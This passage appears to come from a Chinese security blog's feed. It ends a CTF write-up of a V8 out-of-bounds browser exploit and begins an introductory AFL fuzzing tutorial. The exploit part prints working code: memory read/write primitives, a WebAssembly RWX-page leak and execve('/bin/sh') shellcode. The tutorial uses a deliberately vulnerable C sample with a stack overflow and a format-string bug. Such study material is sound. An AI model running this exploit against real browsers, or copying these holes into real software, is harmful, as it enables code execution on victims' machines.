class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>复现了蛮久的，细节还需要多理解。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/6844904096260947981#heading-2">https://juejin.im/post/6844904096260947981#heading-2</a></p><p><a href="https://changochen.github.io/2019-04-29-starctf-2019.html">https://changochen.github.io/2019-04-29-starctf-2019.html</a></p><p><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p><p><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p><p><a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Chromium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz&quot;入门&quot;</title>
      <link href="posts/2ba75ee3/"/>
      <url>posts/2ba75ee3/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzz-简介"><a href="#Fuzz-简介" class="headerlink" title="Fuzz 简介"></a>Fuzz 简介</h1><p><strong>模糊测试</strong> （fuzz testing, fuzzing）是一种<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95">软件测试</a>技术。其核心思想是将自动或半自动生成的随机数据输入到一个<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">程序</a>中，并监视程序异常，如崩溃，<a href="https://zh.wikipedia.org/wiki/%E6%96%B7%E8%A8%80_(%E7%A8%8B%E5%BC%8F)">断言</a>（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><h2 id="Fuzz-的发展历程"><a href="#Fuzz-的发展历程" class="headerlink" title="Fuzz 的发展历程"></a>Fuzz 的发展历程</h2><ol><li><p>文件Fuzzing技术</p></li><li><p>语法模板Fuzzing</p></li><li><p>符号执行</p><p> 符号执行在学术界中应用得比较多，工业界相对少一些。在Fuzzing中，通过约束求解新路径的条件值，以增加代码覆盖率，可以一定程度上弥补暴力变异的不足。符号执行主要的挑战在于路径爆炸问题，约束求解能力的局限性，以及性能消耗问题，比如内存和时间消耗过大。</p></li><li><p>代码覆盖引导技术</p><p> 目前业界中基于代码覆盖率的最著名的三大Fuzzer，Google开发的<code>AFL</code>、<code>libfuzzer</code>和<code>honggfuzz</code>，且他们都是开源的，在github上都可以搜索到。</p></li></ol><h2 id="Pros-amp-Cons"><a href="#Pros-amp-Cons" class="headerlink" title="Pros &amp; Cons"></a>Pros &amp; Cons</h2><p>Fuzzing 是对于寻找漏洞是非常有效的，但其不是万能的，以下是它的一些优缺点。</p><p><strong>Pros</strong></p><ul><li>（不需要持续交互）Provides results with little effort - once a fuzzer’s up and running, it can be left for hours, days, or months to look for bugs with no interaction</li><li>Can reveal bugs missed in a manual audit</li><li>（检测程序整体的稳定性）Provides an overall picture of the robustness of the target software</li></ul><p><strong>Cons</strong></p><ul><li>（不能找到所有的漏洞）Won’t find all bugs - fuzzing may miss bugs that don’t trigger a full program crash, and may be less likely to trigger bugs that are only triggered in highly specific circumstances</li><li>（crash 样本比较难分析）The crashing test cases that are produced may be difficult to analyze, as the act of fuzzing doesn’t give you much knowledge of how the software operates internally</li><li>（对于复杂的程序效率会比较低）Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage</li></ul><h2 id="Anatomy-of-a-fuzzer"><a href="#Anatomy-of-a-fuzzer" class="headerlink" title="Anatomy of a fuzzer"></a>Anatomy of a fuzzer</h2><p>为了有效fuzz，fuzzer需要执行以下任务</p><ul><li>生成测试样本</li><li>记录测试用例的信息</li><li>把测试样例作为输入文件和目标程序（loader）进行对接</li><li>检测并监控 <code>crash</code></li></ul><p>其实上述所说的也就是一个 fuzzer 完整跑一遍的流程的简化。</p><h2 id="What-should-I-fuzz-Finding-the-right-software"><a href="#What-should-I-fuzz-Finding-the-right-software" class="headerlink" title="What should I fuzz? Finding the right software"></a>What should I fuzz? Finding the right software</h2><p>AFL在C或C ++应用程序上效果最好，因此，在 fuzz 之前一个”有效”的软件的攻击面是更为重要的。</p><ol><li>软件是否有示例代码？<ul><li>我们要 fuzz 的软件可能是很复杂很庞大的，如果其拥有大量的实例代码，那么我们快速定位到特定的模块，对每个模块单独 fuzz，这样测试的效果会更加优越。</li></ul></li><li>是否开源？<ul><li>对比开源项目来讲 afl 的效率会高很多，虽然 afl 也支持使用 qemu 进行黑盒 fuzz，但是效率会大打折扣。</li></ul></li><li>特殊样本是否容易收集？<ul><li>我们可能会要 fuzz 不同的文件格式，如果能够快速收集到大量有效的特殊的样本，那么 fuzz 的效率也会随之提高。</li></ul></li></ol><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha? Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行”突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803080223.jpeg" alt="afl"></p><blockquote><p>程序插桩:<br>最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>（又称为“探测仪”，本质上就是进行信息采集的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5/9966451">代码段</a>，可以是<a href="https://baike.baidu.com/item/%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5/4248688">赋值语句</a>或采集覆盖信息的<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/4127405">函数调用</a>），通过<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>的执行并抛出程序运行的<a href="https://baike.baidu.com/item/%E7%89%B9%E5%BE%81/6205236">特征</a>数据，通过对这些数据的<a href="https://baike.baidu.com/item/%E5%88%86%E6%9E%90/4327108">分析</a>，可以获得程序的<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E6%B5%81/854473">控制流</a>和数据流信息，进而得到<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E8%A6%86%E7%9B%96/3231015">逻辑覆盖</a>等动态信息，从而实现测试目的的方法。</p><p>代码覆盖率：<br>软件测试中的一种度量，描述程式中源代码被测试的比例和程度，所得比例称为代码覆盖率。</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><blockquote><p>推荐自己编译安装，apt 安装不支持黑盒测试。</p></blockquote><h2 id="Fuzz目标"><a href="#Fuzz目标" class="headerlink" title="Fuzz目标"></a>Fuzz目标</h2><p><code>AFL</code>主要用于<code>C/C++</code>程序的测试，所以这是我们寻找软件的最优先规则。</p><p>目标开源与否不是很重要。</p><ul><li><p>对于开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz（效率更高</p></li><li><p>对于闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</p></li></ul><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库（”有用的”输入的集合）</p><h3 id="语料库选择"><a href="#语料库选择" class="headerlink" title="语料库选择"></a>语料库选择</h3><ul><li>有效的输入：尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</li><li>尽量小的体积：种子文件最好小于 1KB，较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存。</li></ul><h3 id="主要来源"><a href="#主要来源" class="headerlink" title="主要来源"></a>主要来源</h3><ol><li><p>使用项目自身提供的测试用例</p></li><li><p>目标程序bug提交页面</p></li><li><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p></li><li><p>afl源码的testcases目录下提供了一些测试用例</p></li><li><p>其他大型的语料库</p><ul><li><p><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a></p></li><li><p><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></p></li><li><p><a href="https://samples.libav.org/">libav samples</a></p></li><li><p><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></p></li><li><p><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></p></li><li><p><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></p></li></ul></li></ol><h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——<code>afl-cmin</code>和<code>afl-tmin</code>。</p><h4 id="AFL-CMIN"><a href="#AFL-CMIN" class="headerlink" title="AFL-CMIN"></a>AFL-CMIN</h4><p><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</code></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用<code>@@</code>代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></p><h4 id="AFL-TMIN"><a href="#AFL-TMIN" class="headerlink" title="AFL-TMIN"></a>AFL-TMIN</h4><p><code>afl-tmin</code>用来缩减文件体积。</p><p><code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>。</p><p>命令： <code>$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</code> </p><p>如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。</p><p>命令：<code>$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</code></p><h1 id="AFL实例"><a href="#AFL实例" class="headerlink" title="AFL实例"></a>AFL实例</h1><h2 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>) &#123;</span><br><span class="line">        raise(SIGSEGV); <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>) &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir fuzz_test; <span class="built_in">cd</span> fuzz_test </span><br><span class="line">$ mkdir fuzz_in fuzz_out</span><br><span class="line">$ afl-gcc -g -o afl_test afl_test.c //插桩编译</span><br><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><blockquote><p>ps：随便在 fuzz_in 放一些种子文件即可。</p><p>命令解析：</p><ul><li><p><code>-i</code>：指定测试样本的路径</p></li><li><p><code>-o</code>：指定输出结果的路径</p></li><li><p>更详细见：<code>$ afl-fuzz -h</code></p></li><li><p><code>echo core &gt;/proc/sys/kernel/core_pattern</code></p><p>  在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件</p></li></ul></blockquote><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803145522.png"></p><h2 id="窗口解读"><a href="#窗口解读" class="headerlink" title="窗口解读"></a>窗口解读</h2><ul><li><p>Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p></li><li><p>Overall results：Fuzzer当前状态的概述。</p></li><li><p>Cycle progress：我们输入队列的距离。</p></li><li><p>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p></li><li><p>Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p></li><li><p>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p></li><li><p>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p></li><li><p>Path geometry：有关Fuzzer找到的执行路径的信息。</p></li><li><p>CPU load：CPU利用率</p></li></ul><h2 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h2><p>因为程序本身很简单，跑了几分钟跑出来 4 个<code>crash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000004,sig:06,src:000000,op:havoc,rep:64</span><br><span class="line"></span><br><span class="line">00000000: 4100 7f00 00f1 83ec ff00 7f00 00f1 7fff  A...............</span><br><span class="line">00000010: ffff 0c41 007f 0000 f1a2 ffff ff0b fd5f  ...A..........._</span><br><span class="line">00000020: 8000 0000 fe0c 5f6b 2000 ff0c 6200 7f0c  ......_k ...b...</span><br><span class="line">00000030: 5f6b 00f1 7fec ff00 7f00 00f1 7fff ffff  _k..............</span><br><span class="line">00000040: 0c41 007f 0000 f1a2 ffff ff0b fd5f 8000  .A..........._..</span><br><span class="line">00000050: 0000 fe0c 5f6b 2000 ff0c 6200 7f0c 5f6b  ...._k ...b..._k</span><br><span class="line">00000060: 0000 00fe 8108 7f00 0000 00fe 405f 6b00  ............@_k.</span><br><span class="line">00000070: 00ff 0000 f17f ecff 007f 0000 f17f ffff  ................</span><br><span class="line">00000080: ff0c 4100 7f00 00f1 a2ff ffff 0bfd 5f80  ..A..........._.</span><br><span class="line">00000090: 0000 00fe 0c5f 6b20 0000 00fe 7e0c 4100  ....._k ....~.A.</span><br><span class="line">000000a0: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">000000b0: 0c5f 6700 0000 fe7e 0800 0000 fe81 087f  ._g....~........</span><br><span class="line">000000c0: 0000 0000 fe40 5f6b 0000 00ff 4100 7f00  .....@_k....A...</span><br><span class="line">000000d0: 00f1 a2ff ffff 0bfd 5f80 0000 00fe 0c5f  ........_......_</span><br><span class="line">000000e0: 6b20 00ff 0c62 007f 0c5f 6b00 0000 fe72  k ...b..._k....r</span><br><span class="line">000000f0: 087f 0000 0000 fe40 5f6b 0000 ff0c 4100  .......@_k....A.</span><br><span class="line">00000100: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">00000110: 0c5f 6700 0000 fe7e 0c41 007f 0000 f17f  ._g....~.A......</span><br><span class="line">00000120: ffff ff0b ec5f 8000 0000 fe0c 5f67 0000  ....._......_g..</span><br><span class="line">00000130: 00fe 7e08                                ..~.</span><br></pre></td></tr></table></figure><p>可以看出来是由栈溢出所导致的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000002,sig:06,src:000000,op:havoc,rep:128</span><br><span class="line">00000000: 256e                                     %n</span><br></pre></td></tr></table></figure><p>格式化字符串导致。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxd id:000000,sig:11,src:000001,op:havoc,rep:4</span><br><span class="line">00000000: 4672 6497 7364                           Frd.sd</span><br></pre></td></tr></table></figure><p>输入的字符串的首字符为F并且长度为6，则异常退出</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>黑盒测试要用到AFL的QEMU模式了。</p><p>所以我们需要再额外装一下东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52/qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br><span class="line">$ <span class="built_in">cd</span> .. </span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>我们接着用刚刚的源文件重新编译然后进行新的黑盒 fuzz。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -o afl_test2 afl_test.c</span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200804111331.png" alt="image"></p><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 